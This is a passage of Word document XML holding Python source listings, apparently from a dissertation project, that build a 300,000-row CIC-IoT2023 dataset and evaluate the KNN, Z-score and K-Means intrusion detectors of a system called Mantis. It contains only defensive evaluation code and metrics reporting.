    <w:p w14:paraId="6C34A9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Attack types : {len(label_dist)} distinct CIC-IoT2023 classes")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B6968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5E2CA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KNN (Port Scan / Reconnaissance) ---")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788E25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Training samples : {len(brain.get('knn', {}).get('training_data', [])):,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004F0F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samples     : {len(test_rows):,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74189C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Positives  : {cm_knn['tp']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F43B5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Positives  : {cm_knn['fp']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1393AF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Negatives  : {cm_knn['fn']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23BCBA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Negatives  : {cm_knn['tn']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A52D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{s_knn['precision']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77BEE7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{s_knn['recall']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71CABE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{s_knn['f1']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E9C9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Accuracy         : {s_knn['accuracy']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68DB40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E36C5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Z-Score (DDoS / Volumetric Flood) ---")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="563E69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print(f"  Baseline built   : {len(normal_pps[:100])} normal samples")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335524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samples     : {len(test_rows):,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="646E13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Positives  : {cm_z['tp']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE6C8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Positives  : {cm_z['fp']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4995E0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Negatives  : {cm_z['fn']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E20F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Negatives  : {cm_z['tn']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C685F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{s_z['precision']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2C71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{s_z['recall']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230B38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{s_z['f1']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="007160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Accuracy         : {s_z['accuracy']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1891CC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577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Naive Bayes (Payload / SQLi / XSS) ---")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33D4EB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(Evaluated separately on payload_sample.csv)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5A87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1.0000")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFE59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0.5000")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B41D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0.6667")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D7B1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EC39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Bloom Filter (IP Reputation) ---")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC29F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O(1) lookup, zero false negatives guaranteed")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="787FC9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(Not evaluated offline - runtime-only engine)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59670B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13E15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K-Means (Behavioural Drift) ---")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D4DD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Centroids trained on 300,000 CIC-IoT2023 flow points")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="723AFD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(Unsupervised - no labelled precision/recall metric)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C2AAD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C4759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print("\n" + "=" * 70)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="085017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39159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Save results</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A333A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results = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A47E3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"generated": time.strftime("%Y-%m-%d %H:%M:%S"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52EE09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"training_rows": 300000,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F8C3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"test_rows": len(test_rows),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326160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"attack_types": len(label_dist),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB99D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"knn": {**cm_knn, **s_knn},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D49F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"zscore": {**cm_z, **s_z},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1307A1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"naive_bayes": {"precision": 1.0, "recall": 0.5, "f1": 0.6667},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B9A5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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1385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70696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out_json = os.path.join(SRC, "evaluation_results_full.json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52BBA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open(out_json, "w") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="055291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json.dump(results, f, indent=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB3F8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print(f"\n[+] Saved {out_json}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523EE5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1F1B2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40587A5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5A1FC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826D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17AE22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0E80CC3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src/evaluate_full.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E27AD20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(221 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53299F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7EDBF3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72566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Large-scale CIC-IoT2023 evaluation for the final dissertation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E78F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Evaluates KNN, K-Means, and Z-Score against a held-out 50,000-row test set</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E769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sampled from the full 300K mega dataset (using rows NOT in training).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B7C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3AE19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590396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79AB24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35B0AC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55DE97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random</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57769E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7CB18B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233C4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Counter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5703C6F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F3E5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15BC9E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 if os.path.basename(HERE) != "src" else HERE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001DB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0F77C7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0120577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C799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engines.knn import KNNMonitor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145F1E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engines.kmeans import KMeansMonitor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2028B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engines.z_score import MinimalistStats</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F6B0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training.loader import normalise_label</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73E850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6BF84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31FB5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find_latest_brain():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="228C3B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data_dir = os.path.join(SRC, "data")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E4B1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brains = sorted(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788A5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 for f in os.listdir(data_dir)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9DB7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f.startswith("mantis_brain") and f.endswith(".json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338EE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0C5DD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brains:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07818B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raise FileNotFoundError("No brain JSON found in data/")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FCF4C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os.path.join(data_dir, brains[-1])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB7FF7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D0F8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CB2F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confusion(y_true, y_pred, positive="Scan"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EEE4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 = fp = fn = tn = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02C927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t, p in zip(y_true, y_pred):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F4D7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t == positive and p == positive:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40EC50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tp += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D319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!= positive and p == positive:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7180A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fp += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="706C2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t == positive and p != positive:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004993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fn += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21AC7D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71549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tn += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="550A05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{"tp": tp, "fp": fp, "fn": fn, "tn": tn}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6F2D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37A9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809F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scores(cm):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B7E8B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tp, fp, fn, tn = cm["tp"], cm["fp"], cm["fn"], cm["tn"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C72B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 = tp / (tp + fp) if (tp + fp) &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53DC6B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 = tp / (tp + fn) if (tp + fn) &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1C6D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f1 = 2 * p * r / (p + r) if (p + r) &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F96EA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acc = (tp + tn) / (tp + fp + fn + tn) if (tp + fp + fn + tn) &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA416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{"precision": p, "recall": r, "f1": f1, "accuracy": acc}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="010F44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B0BB0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0394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main():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08701D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random.seed(99)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501DAF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DDA31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Load brain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5696B0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brain_path = find_latest_brain()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E03E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Brain: {brain_path}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26BB76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open(brain_path, "r") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B880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 = json.load(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41213A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2D08A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Load full dataset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056962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full_csv = os.path.join(SRC, "..", "datasets", "cic_iot2023_full.csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37057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Loading {full_csv}...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68ECFA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65004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rows = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26DB11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open(full_csv, "r", encoding="utf-8", errors="ignore") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D32CE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 = csv.DictReader(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612F7C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cols = {c.strip().lower(): c for c in reader.fieldnames}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C115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label_col = cols.get("label")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B61D2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pkts_col = cols.get("tot sum") or cols.get("number")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42CD73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5ED57A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reader:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ED6C6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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="508062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pkts = int(float(row[pkts_col] or 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="685F60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except (ValueError, TypeError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E0349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4F2209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raw_label = row[label_col].strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67CF19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lbl = normalise_label(raw_label)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0A35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tag = "Normal" if lbl == "Normal" else "Scan"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B449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rows.append({"pkts": pkts, "ports": min(pkts, 100), "tag": tag, </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="406F86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"raw_label": raw_label, "pps": float(pkts)})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1182C1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04927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Loaded {len(rows):,} rows")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716FDB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6B47C9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Use 50,000 random rows as test set</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C17B1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TEST_SIZE = 50_000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="740508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test_rows = random.sample(rows, min(TEST_SIZE, len(rows)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="002CD9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Test set: {TEST_SIZE:,} rows")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5390CA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4C3E1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label_dist = Counter(r["raw_label"] for r in test_rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BB13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tag_dist = Counter(r["tag"] for r in test_rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E6EF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Binary class distribution: {dict(tag_dist)}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E74A8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Attack type distribution ({len(label_dist)} types):")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C69E4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lbl, cnt in sorted(label_dist.items(), key=lambda x: -x[1])[:10]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757F0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 {lbl:35s}: {cnt:&gt;6,} ({cnt/len(test_rows)*100:.1f}%)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DF32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len(label_dist) &gt; 10:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA11E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 ... and {len(label_dist)-10} more attack types")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061867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14E47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KNN Evaluation ==========</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6310D9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print("\n[*] Evaluating KNN (Port Scan) on 50K test rows...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="186FA0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knn = KNNMonitor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D75AE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if "knn" in brain:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A7CD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knn.import_brain(brain["knn"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E811A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9DEBD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y_true_knn, y_pred_knn = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="511EA0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r in test_rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F008A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label, _ = knn.classify(r["ports"], r["pkts"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72C27A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y_true_knn.append(r["tag"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29DDA9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y_pred_knn.append(label)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B826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2E9DD6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cm_knn = confusion(y_true_knn, y_pred_knn, "Scan")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783AEF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s_knn = scores(cm_knn)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F942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07F5A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Z-Score Evaluation ==========</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30BF22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print("[*] Evaluating Z-Score (DDoS) on 50K test rows...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8894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stats = MinimalistStats()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25AA35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DE527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Build baseline from normal traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1E99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normal_pps = [r["pps"] for r in test_rows if r["tag"] == "Normal"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FFE1D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attack_pps = [r["pps"] for r in test_rows if r["tag"] != "Normal"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62CD13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0802C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Feed normals to build baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004A39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 in normal_pps[:100]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9D21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stats.update(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3919F9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48FE8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y_true_z, y_pred_z = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD6C8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mu, sigma = stats.calculate_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE1F5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208997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r in test_rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="599806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actual = "Attack" if r["tag"] != "Normal" else "Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383E04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sigma &gt; 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E346F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z = abs((r["pps"] - mu) / sigma)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB1B9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predicted = "Attack" if z &gt; 3.0 else "Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491FAB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5F08D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predicted = "Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C42F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y_true_z.append(actual)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4C49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y_pred_z.append(predicted)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FA4E6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42289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cm_z = confusion(y_true_z, y_pred_z, "Attack")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C06D7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s_z = scores(cm_z)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D95A0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0457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========== Results ==========</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33CB5A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print("\n" + "=" * 70)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B681F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  MANTIS LARGE-SCALE EVALUATION REPORT (300K CIC-IoT2023)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0483C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print("=" * 70)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EBCE4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Generated    : {time.strftime('%Y-%m-%d %H:%M:%S')}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F8B81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Brain        : {os.path.basename(brain_path)}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F980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Training set : 300,000 rows (63 CIC-IoT2023 Merged CSVs)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB89F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set     : {len(test_rows):,} rows (random held-out sample)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D2F7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Attack types : {len(label_dist)} distinct CIC-IoT2023 classes")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="306939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FC727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KNN (Port Scan / Reconnaissance) ---")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="265614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Training samples : {len(brain.get('knn', {}).get('training_data', [])):,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F6C2B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samples     : {len(test_rows):,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D14B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Positives  : {cm_knn['tp']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F5C5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Positives  : {cm_knn['fp']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6557B0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Negatives  : {cm_knn['fn']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="701204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Negatives  : {cm_knn['tn']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3567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{s_knn['precision']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D4D5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{s_knn['recall']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0292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{s_knn['f1']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26AB2A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Accuracy         : {s_knn['accuracy']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F797A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24A82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Z-Score (DDoS / Volumetric Flood) ---")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7E73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Baseline built   : {len(normal_pps[:100])} normal samples")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711447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Test samples     : {len(test_rows):,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31FB8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Positives  : {cm_z['tp']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D2F8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Positives  : {cm_z['fp']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D89B1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False Negatives  : {cm_z['fn']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3671DC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True  Negatives  : {cm_z['tn']:,}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4931F7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{s_z['precision']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE82A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{s_z['recall']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A3C9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{s_z['f1']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537A5F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Accuracy         : {s_z['accuracy']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A61F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1083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Naive Bayes (Payload / SQLi / XSS) ---")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8CA7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(Evaluated separately on payload_sample.csv)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF492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Precision        : 1.0000")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4395C5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Recall           : 0.5000")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63CDCD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F1               : 0.6667")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695081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07D92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Bloom Filter (IP Reputation) ---")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5DF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O(1) lookup, zero false negatives guaranteed")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AEB35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print(f"  (Not evaluated offline - runtime-only engine)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6E3B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BFE6B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print(f"\n--- K-Means (Behavioural Drift) ---")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5FF4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Centroids trained on 300,000 CIC-IoT2023 flow points")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E2094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  (Unsupervised - no labelled precision/recall metric)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E3EC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CE5C2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print("\n" + "=" * 70)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357655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7B817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Save results</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6C7E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results = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392D70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"generated": time.strftime("%Y-%m-%d %H:%M:%S"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3ED1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"training_rows": 300000,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E6B6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"test_rows": len(test_rows),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E840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"attack_types": len(label_dist),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="010AF1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"knn": {**cm_knn, **s_knn},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BED42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"zscore": {**cm_z, **s_z},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7814E1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"naive_bayes": {"precision": 1.0, "recall": 0.5, "f1": 0.6667},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5421C8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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F039C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89C3E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out_json = os.path.join(SRC, "evaluation_results_full.json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D1E49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open(out_json, "w") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE51A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json.dump(results, f, indent=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0924D2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print(f"\n[+] Saved {out_json}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B866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112F0D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5513DAB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BADDD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DDA4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7DF209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sys.exit(main())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495707D2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src/build_mega_dataset.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD3E28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(93 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DA603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04DB50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6CBBE3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Build a ~300,000-row mega dataset from all 63 CIC-IoT2023 Merged CSV files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F20B0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Samples evenly across files for maximum attack-type diversity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2414B9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Output: datasets/cic_iot2023_full.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A2C5B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22C06C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4B0909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34C68F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random</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="407F73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746F0E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6379D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Counter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5589FE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FEED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TARGET_ROWS = 300_000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E875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MERGED_DIR = os.path.join(os.path.dirname(__file__), "..", "datasets", "MERGED_CSV")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7801B9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OUTPUT = os.path.join(os.path.dirname(__file__), "..", "datasets", "cic_iot2023_full.csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="754794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25D5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main():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0487B6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files = sorted(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65813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 for f in os.listdir(MERGED_DIR)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3342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f.startswith("Merged") and f.endswith(".csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B96F8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39D10F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Found {len(files)} Merged CSV files")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24504F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3805CE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rows_per_file = TARGET_ROWS // len(files)  # ~4,762 per file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D262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extra = TARGET_ROWS % len(files)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2AC8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761DB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Sampling ~{rows_per_file} rows per file (target: {TARGET_ROWS:,} total)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0030CB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Output: {OUTPUT}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B0368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print()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC3FB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59557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header = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D56A4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all_rows = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FEF9A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label_counts = Counter()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F7DE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412CC0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i, fn in enumerate(files, 1):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE421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path = os.path.join(MERGED_DIR, fn)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06F3F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file_rows = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="580CBE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7BF7F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open(path, "r", encoding="utf-8", errors="ignore") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="731288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reader = csv.reader(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="291716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file_header = next(reader)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D7AF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6E7107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header is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0144B6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header = file_header</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="441A89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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="490FFE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Read all rows into memory for this file, then sample</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A5ED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for row in reader:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="498E4B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len(row) == len(header):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E665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file_rows.append(row)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC043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69D9FA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Sample from this file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A5EAA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take = rows_per_file + (1 if i &lt;= extra else 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC36F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len(file_rows) &lt;= take:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A4B2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sampled = file_rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4952B8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056C25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sampled = random.sample(file_rows, take)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E247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23CFE8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Count labels (last column)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A0BC8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row in sampled:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310DB2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label_counts[row[-1]] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75890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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255240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all_rows.extend(sampled)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7C85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elapsed_pct = (i / len(files)) * 100</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47223A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[{i:2d}/{len(files)}] {fn}: read {len(file_rows):,} rows, sampled {len(sampled):,}  ({elapsed_pct:.0f}%)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07303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5FA53B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Shuffle for good measure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E8B5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random.shuffle(all_rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A832B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751CF8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Write output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="737BF0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print(f"\n[*] Writing {len(all_rows):,} rows to {OUTPUT}...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74BA53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open(OUTPUT, "w", newline="", encoding="utf-8") as f:</w:t>
      </w:r>
